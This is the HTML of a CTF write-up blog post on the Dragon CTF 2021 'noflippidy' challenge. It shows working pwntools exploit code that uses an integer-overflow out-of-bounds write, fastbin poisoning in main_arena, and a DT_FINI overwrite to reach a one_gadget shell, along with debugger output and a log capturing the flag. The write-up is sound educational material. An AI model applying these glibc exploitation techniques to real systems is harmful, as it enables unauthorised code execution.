@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Dragon CTF 2021 - noflippidy | kileak</title>
+
+
+
+
+
+<meta name="description" content="Dragon CTF 2021 - noflippidy">
+
+
+<meta name="keywords" content="dragon, noflippidy">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2021/dragoncf21-noflippidy/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Dragon CTF 2021 - noflippidy</h1>
+      <p class="post-meta">Nov 28, 2021</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>noflippidy
+<!--break--></p>
+
+  <p>Have you played DiceCTF 2021? We sure did! We even solved a challenge!
+Here, have some writeups: https://ctftime.org/task/14692
+Note: the server of course runs the “noflippidy” binary.
+This challenge is running on Ubuntu 18.04.</p>
+
+  <p>nc noflippidy.hackable.software 1337</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/dragonctf21/noflippidy/noflippidy.tar.gz">noflippidy.tar.gz</a> <a href="https://kileak.github.io/assets/dragonctf21/noflippidy/xpl.py">xpl.py</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">---------- FLIPPIDYDIPPILF ----------
+In this very realistic scenario our protagonist (you!) finds himself in search of a notebook...
+That can flip itself!
+This notebook flips its pages very well. I hope it suits someone as powerful as you.
+
+
+Just give it the word, and the pages will reverse themselves!
+To get started, first tell us how big your notebook will be: 10
+
+
+----- Menu -----
+1. Add to your notebook
+2. Flip your notebook!
+3. Exit
+: </code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">noflippidy</code> seemed to be a remake of the <code class="language-plaintext highlighter-rouge">flippidy</code> challenge, but the binary was patched.</p>
+
+<p>When trying to <code class="language-plaintext highlighter-rouge">flip</code> the notebook, it would first check, if the canary is <code class="language-plaintext highlighter-rouge">0x0</code> and otherwise just leaves the function, effectively disable the usage of <code class="language-plaintext highlighter-rouge">flip</code> completely.</p>
+
+<p>The only thing, we can do, is adding new entries to our notebook, which would not give us much to work with, if there wasn’t another bug in the allocation of the notebook itself.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="s">"To get started, first tell us how big your notebook will be: "</span><span class="p">);</span>
+<span class="n">NOTEBOOK_SIZE</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+<span class="n">NOTEBOOK</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="n">NOTEBOOK_SIZE</span><span class="p">);</span></code></pre></figure>
+
+<p>Since <code class="language-plaintext highlighter-rouge">NOTEBOOK_SIZE</code> is an <code class="language-plaintext highlighter-rouge">int</code>, <code class="language-plaintext highlighter-rouge">8 * NOTEBOOK_SIZE</code> can overflow, which would lead in a big <code class="language-plaintext highlighter-rouge">NOTEBOOK_SIZE</code> but a smaller allocated <code class="language-plaintext highlighter-rouge">NOTEBOOK</code> chunk, by which we could then add notebook entries outside of the allocated chunk.</p>
+
+<p>But as long, as we stay on the <code class="language-plaintext highlighter-rouge">heap</code>, this would also not be very useful, since there are no calls to <code class="language-plaintext highlighter-rouge">free</code> or anything useful on the heap to overwrite. Allocating a notebook with a size, which will not be served by <code class="language-plaintext highlighter-rouge">heap</code> but by an <code class="language-plaintext highlighter-rouge">mmapped</code> region on the other hand might make this oob access more useful.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"noflippidy.hackable.software"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="n">PROCESS</span> <span class="o">=</span> <span class="s">"./noflippidy"</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+	<span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">LEAK</span>
+
+<span class="k">def</span> <span class="nf">flip</span><span class="p">():</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create notebook in mmapped region before libc"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x300200020</span><span class="o">/</span><span class="mi">8</span><span class="p">))</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+	
+	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+	
+	<span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+	<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+		<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>		
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./noflippidy"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span><span class="s">"./libc.so.6"</span><span class="p">})</span>		
+		<span class="k">print</span> <span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+		<span class="n">pause</span><span class="p">()</span>
+	
+	<span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x404110:	0x0000000000000000	0x0000000000000000
+0x404120 &lt;stdout&gt;:	0x00007ffff7dce760	0x0000000000000000
+0x404130 &lt;stdin&gt;:	0x00007ffff7dcda00	0x0000000000000000
+0x404140 &lt;stderr&gt;:	0x00007ffff7dce680	0x0000000000000000
+0x404150:	0x0000000060040004	0x00007ffff77e1010 &lt;= NOTEBOOK_SIZE / NOTEBOOK
+0x404160:	0x0000000000000000	0x0000000000000000
+
+gef➤  vmmap
+[ Legend:  Code | Heap | Stack ]
+Start              End                Offset             Perm Path
+0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /media/sf_ctf/dragon21/flip/task/noflippidy
+0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /media/sf_ctf/dragon21/flip/task/noflippidy
+0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /media/sf_ctf/dragon21/flip/task/noflippidy
+0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /media/sf_ctf/dragon21/flip/task/noflippidy
+0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /media/sf_ctf/dragon21/flip/task/noflippidy
+0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
+0x00007ffff77e1000 0x00007ffff79e2000 0x0000000000000000 rw- &lt;= NOTEBOOK region
+0x00007ffff79e2000 0x00007ffff7bc9000 0x0000000000000000 r-x /media/sf_ctf/dragon21/flip/task/libc.so.6
+0x00007ffff7bc9000 0x00007ffff7dc9000 0x00000000001e7000 --- /media/sf_ctf/dragon21/flip/task/libc.so.6
+0x00007ffff7dc9000 0x00007ffff7dcd000 0x00000000001e7000 r-- /media/sf_ctf/dragon21/flip/task/libc.so.6
+0x00007ffff7dcd000 0x00007ffff7dcf000 0x00000000001eb000 rw- /media/sf_ctf/dragon21/flip/task/libc.so.6
+0x00007ffff7dcf000 0x00007ffff7dd3000 0x0000000000000000 rw- 
+0x00007ffff7dd3000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ff5000 0x00007ffff7ff7000 0x0000000000000000 rw- 
+0x00007ffff7ff7000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
+0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
+0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">notebook</code> is now allocated directly before libc, thus all relative offsets will be the same (despite ASLR) to the <code class="language-plaintext highlighter-rouge">libc rw</code> region as also to <code class="language-plaintext highlighter-rouge">ld rw</code> region.</p>
+
+<p>Now the oob access in notebook becomes more useful. Since offsets will always be the same, we can create notes and have their pointers overwrite something in either <code class="language-plaintext highlighter-rouge">libc</code> or <code class="language-plaintext highlighter-rouge">ld</code>. <code class="language-plaintext highlighter-rouge">exitfuncs</code> of libc are mangled, so there’s no point in overwriting them, but we can abuse <code class="language-plaintext highlighter-rouge">_dl_fini</code> from <code class="language-plaintext highlighter-rouge">ld</code> to get <code class="language-plaintext highlighter-rouge">rip</code> control.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">void_dl_fini</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>  
+          <span class="p">...</span>
+          
+          <span class="n">_dl_sort_maps</span> <span class="p">(</span><span class="n">maps</span> <span class="o">+</span> <span class="p">(</span><span class="n">ns</span> <span class="o">==</span> <span class="n">LM_ID_BASE</span><span class="p">),</span> <span class="n">nmaps</span> <span class="o">-</span> <span class="p">(</span><span class="n">ns</span> <span class="o">==</span> <span class="n">LM_ID_BASE</span><span class="p">),</span>
+                         <span class="nb">NULL</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
+          
+          <span class="p">...</span>
+
+          <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nmaps</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+            <span class="p">{</span>
+              <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span> <span class="o">=</span> <span class="n">maps</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+              <span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_init_called</span><span class="p">)</span>
+                <span class="p">{</span>
+                  <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_init_called</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                  
+                  <span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI_ARRAY</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+                    <span class="p">{</span>                      
+                      <span class="cm">/* First see whether an array is given.  */</span>
+                      <span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI_ARRAY</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+                        <span class="p">{</span>
+                          <span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="o">*</span><span class="n">array</span> <span class="o">=</span> <span class="p">(</span><span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_addr</span> <span class="o">+</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI_ARRAY</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">d_un</span><span class="p">.</span><span class="n">d_ptr</span><span class="p">);</span>
+                          
+                          <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI_ARRAYSZ</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">d_un</span><span class="p">.</span><span class="n">d_val</span>
+                                            <span class="o">/</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)));</span>
+
+                          <span class="k">while</span> <span class="p">(</span><span class="n">i</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+                            <span class="p">((</span><span class="n">fini_t</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">();</span>
+                        <span class="p">}</span>
+
+                      <span class="cm">/* Next try the old-style destructor.  */</span>
+                      <span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+                        <span class="n">DL_CALL_DT_FINI</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_addr</span> <span class="o">+</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">d_un</span><span class="p">.</span><span class="n">d_ptr</span><span class="p">);</span>
+                    <span class="p">}</span>
+            <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This gives us two primitives to do arbitrary calls.</p>
+
+<p>One is by overwriting <code class="language-plaintext highlighter-rouge">DT_FINI_ARRAY</code>, which will result in calling our function by <code class="language-plaintext highlighter-rouge">((fini_t)array[i])();</code>. Though, we can only define an address which points to the function we want to call.</p>
+
+<p>The second call is <code class="language-plaintext highlighter-rouge">DL_CALL_DT_FINI (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</code>, where we can store an arbitrary address, which will be called.</p>
+
+<p>At first, I tried combining those two (also since at first, I only mmapped a region before <code class="language-plaintext highlighter-rouge">ld</code>, thus having no access to <code class="language-plaintext highlighter-rouge">libc</code>), to use the first call to leak something and the second call to jump back into main. But we’ll not be able to trigger <code class="language-plaintext highlighter-rouge">_dl_fini</code> again after that and we would only be able to leak a heap address, which didn’t really helped much.</p>
+
+<p>After a while, I changed the notebook size, as shown at the beginning, and with having a region before libc, we have a better chance to get a leak <em>before</em> going into <code class="language-plaintext highlighter-rouge">_dl_fini</code>. When discussing this with <code class="language-plaintext highlighter-rouge">hk</code>, he brought up the idea, that we could abuse freelist in <code class="language-plaintext highlighter-rouge">main_arena</code> to allocate arbitrary chunks, which worked out pretty well.</p>
+
+<p>For getting a leak, I created a chunk, which looked like a freed fastbin and used the relative offset oob, so that the pointer to this chunk would be put into <code class="language-plaintext highlighter-rouge">0x40</code> fastbin in <code class="language-plaintext highlighter-rouge">main_arena</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404000</span><span class="p">)</span>            <span class="o">&lt;=</span> <span class="n">points</span> <span class="n">above</span> <span class="n">menu_ptrs</span>
+
+<span class="n">add</span><span class="p">((</span><span class="mh">0x5ecc60</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>     <span class="o">&lt;=</span> <span class="n">offset</span> <span class="n">to</span> <span class="mh">0x40</span> <span class="n">fastbin</span> <span class="n">main_arena</span></code></pre></figure>
+
+<p>Now, we just have to allocate another <code class="language-plaintext highlighter-rouge">0x40</code> chunk and the next chunk would overwrite the menu pointers, so we just put a pointer to <code class="language-plaintext highlighter-rouge">stdout</code> into it. By doing that, the challenge will print <code class="language-plaintext highlighter-rouge">stdout</code> on every menu print, thus we can just read it and calculate <code class="language-plaintext highlighter-rouge">libc base</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite menu_ptr with pointer to stdout"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404120</span><span class="p">)</span>    <span class="c1"># point to stdout
+</span>
+<span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">payload</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="o">+</span><span class="mi">6</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>Since we now still have the overwrite for <code class="language-plaintext highlighter-rouge">l-&gt;l_info[DT_FINI]</code>, we can now just call a <code class="language-plaintext highlighter-rouge">one_gadget</code>:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite DT_CALL_DT_FINI with one_gadget"</span><span class="p">)</span>		
+<span class="n">ONEGADGET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f432</span>
+
+<span class="c1"># DL_CALL_DT_FINI
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ONEGADGET</span><span class="p">)</span>			    <span class="c1"># call 2 (one gadget)
+</span>	
+<span class="n">add</span><span class="p">((</span><span class="mh">0x81c000</span> <span class="o">+</span> <span class="mh">0x1208</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Exit to trigger _dl_fini"</span><span class="p">)</span>	
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/media/sf_ctf/dragon21/flip/task/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to noflippidy.hackable.software on port 1337: Done
+[*] Create notebook in mmapped region before libc
+[*] Overwrite 0x40 freed fastbin in main_arena and point it to bss
+[*] Overwrite menu_ptr with pointer to stdout
+[*] LIBC        : 0x7fe5c53aa760
+[*] LIBC        : 0x7fe5c4fbe000
+[*] Overwrite DT_CALL_DT_FINI with one_gadget
+[*] Exit to trigger _dl_fini
+[*] Switching to interactive mode
+$ ls
+flag.txt
+noflippidy
+$ cat flag.txt
+DrgnS{R3m3m83r_k1dS_s734L1nG_Is_N07_c00L}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Dragon CTF 2021 - noflippidy&amp;url=https://kileak.github.io/ctf/2021/dragoncf21-noflippidy/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/dragoncf21-noflippidy/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2021/dragoncf21-noflippidy';
+        var disqus_title = 'Dragon CTF 2021 - noflippidy';
+        var disqus_url = 'https://kileak.github.io/ctf/2021/dragoncf21-noflippidy';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
